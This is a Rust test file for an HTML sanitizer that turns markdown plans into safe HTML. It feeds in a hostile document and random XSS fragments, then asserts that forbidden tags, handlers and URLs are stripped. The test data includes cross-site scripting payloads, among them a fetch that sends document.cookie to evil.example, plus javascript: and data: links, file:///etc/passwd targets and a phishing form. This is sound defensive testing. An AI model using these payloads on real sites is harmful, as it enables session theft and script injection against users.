//! The guarantees for the HTML of a plan: a golden test with the attacks
//! that we know, and a property test with random input.

mod support;

use nh_rich::markdown;
use proptest::prelude::*;

/// A plan that an attacker wrote: every way we know to run script, load a resource or open a
/// target that the reader did not choose.
fn hostile_plan() -> String {
    let osc8 = "\u{1b}]8;;file:///etc/passwd\u{7}open the report\u{1b}]8;;\u{7}";
    format!(
        "\
# Plan

Run <script>fetch('https://evil.example/?c='+document.cookie)</script> first.

<img src=x onerror=alert(1)> and <img src=\"https://evil.example/pixel.png\">

[click](javascript:alert(1)) [data](data:text/html,<script>alert(1)</script>) [file](file:///etc/passwd)
[ok](https://example.com/docs?a=1&b=2) [mail](mailto:team@example.com) [rel](../README.md) [anchor](#top)

<svg onload=alert(1)><script>alert(2)</script></svg>

<a href=\"JaVaScRiPt:alert(3)\" onclick=\"alert(4)\" target=_blank>raw anchor</a>

<iframe src=\"https://evil.example\"></iframe><object data=x></object><embed src=x>

<form action=\"https://evil.example\"><input name=password><button>go</button></form>

<style>body {{ display: none }}</style><div style=\"position:fixed;top:0;left:0;width:100%;height:100%\">overlay</div>

<span class=\"fixed inset-0 z-50\">overlay</span> <span class=\"hl-kw\">kept</span>

<!-- hidden comment --> <math><mi xlink:href=\"javascript:alert(5)\">x</mi></math>

<a href=\"nh://open?url=javascript:alert(6)\">spoofed</a> <img src=\"nh://blob/../../x\">

```html
<script>alert(7)</script>
```

{osc8}

- [x] done
- [ ] todo
"
    )
}

#[test]
fn the_hostile_plan_comes_out_safe() {
    let html = markdown(&hostile_plan()).html;
    support::assert_safe(&html);
    for needle in [
        "<script",
        "onerror",
        "onload",
        "onclick",
        "javascript",
        "JaVaScRiPt",
        "data:text",
        "file://",
        "evil.example/pixel",
        "<iframe",
        "<object",
        "<embed",
        "<form",
        "<input",
        "<style",
        "position:fixed",
        "inset-0",
        "xlink",
        "hidden comment",
        "../../x",
    ] {
        assert!(!html.contains(needle), "{needle} in {html}");
    }
    // What is allowed is still there.
    assert!(
        html.contains("href=\"nh://open?url=https%3A%2F%2Fexample.com%2Fdocs%3Fa%3D1%26b%3D2\"")
    );
    assert!(html.contains("href=\"nh://open?url=mailto%3Ateam%40example.com\""));
    assert!(html.contains("<span class=\"hl-kw\">kept</span>"));
    assert!(html.contains("open the report"));
    assert!(html.contains("☑ done"));
}

#[test]
fn the_hostile_plan_makes_the_same_html_every_time() {
    let plan = hostile_plan();
    assert_eq!(markdown(&plan), markdown(&plan));
}

/// Pieces of markdown and HTML that try to break out. The property test glues them together.
fn fragment() -> impl Strategy<Value = String> {
    prop_oneof![
        Just("<script>alert(1)</script>".to_owned()),
        Just("<img src=x onerror=alert(1)>".to_owned()),
        Just("<img src=\"nh://blob/abc123\" onload=x>".to_owned()),
        Just("[x](javascript:alert(1))".to_owned()),
        Just("[x](<JAVASCRIPT:alert(1)>)".to_owned()),
        Just("[x](https://a.example/?q=1&r=2)".to_owned()),
        Just("[x](mailto:a@b.example)".to_owned()),
        Just("[x](data:text/html;base64,PHNjcmlwdD4=)".to_owned()),
        Just("![i](https://evil.example/p.png)".to_owned()),
        Just("![i](nh://blob/abc)".to_owned()),
        Just("<a href=\"javascript:alert(1)\" onclick=x>t</a>".to_owned()),
        Just("<a href=\"https://evil.example\" target=_blank>t</a>".to_owned()),
        Just("<svg onload=alert(1)><circle/></svg>".to_owned()),
        Just("<iframe src=//evil.example></iframe>".to_owned()),
        Just("<style>*{display:none}</style>".to_owned()),
        Just("<form action=x><input name=a></form>".to_owned()),
        Just("<div style=\"position:fixed\">x</div>".to_owned()),
        Just("<span class=\"hl-kw fixed\">x</span>".to_owned()),
        Just("<span class=\"hl-kw\">x</span>".to_owned()),
        Just("<td style=\"text-align: left; x: y\">x</td>".to_owned()),
        Just("<math><mi xlink:href=javascript:x>x</mi></math>".to_owned()),
        Just("<b onmouseover=x>b</b>".to_owned()),
        Just("<!-- c -->".to_owned()),
        Just("<<script>script>alert(1)<</script>/script>".to_owned()),
        Just("<scr<script>ipt>alert(1)</script>".to_owned()),
        Just("<ol start=\"javascript:1\"><li>x</li></ol>".to_owned()),
        Just("```rust\nfn x() {}\n```".to_owned()),
        Just("```\"><img src=x onerror=1>\ncode\n```".to_owned()),
        Just("`<script>`".to_owned()),
        Just("# heading".to_owned()),
        Just("- item\n- [x] done".to_owned()),
        Just("| a | b |\n|:-|-:|\n| 1 | 2 |".to_owned()),
        Just("> quote".to_owned()),
        Just("\u{1b}]8;;file:///x\u{7}t\u{1b}]8;;\u{7}".to_owned()),
        Just("&lt;script&gt;alert(1)&lt;/script&gt;".to_owned()),
        Just("&#x3C;script&#x3E;".to_owned()),
        "\\PC{0,24}",
    ]
}

fn plan() -> impl Strategy<Value = String> {
    let separator = prop_oneof![Just(""), Just(" "), Just("\n"), Just("\n\n")];
    prop::collection::vec((fragment(), separator), 1..14).prop_map(|parts| {
        parts
            .into_iter()
            .map(|(fragment, separator)| format!("{fragment}{separator}"))
            .collect()
    })
}

proptest! {
    #![proptest_config(ProptestConfig::with_cases(400))]

    /// Whatever the text is, the HTML has no tag, attribute, class or URL that is not allowed.
    #[test]
    fn random_markdown_and_html_never_make_forbidden_html(text in plan()) {
        let html = markdown(&text).html;
        support::assert_safe(&html);
        // A client that cleans the HTML of a core again keeps it as it is.
        prop_assert_eq!(nh_rich::markdown::clean(&html), html);
    }

    /// HTML that a hostile core sends as its own is safe after the client cleans it.
    #[test]
    fn the_client_makes_any_html_of_a_core_safe(text in plan()) {
        support::assert_safe(&nh_rich::markdown::clean(&text));
    }

    #[test]
    fn any_text_makes_safe_html(text in "\\PC{0,200}") {
        support::assert_safe(&markdown(&text).html);
    }
}
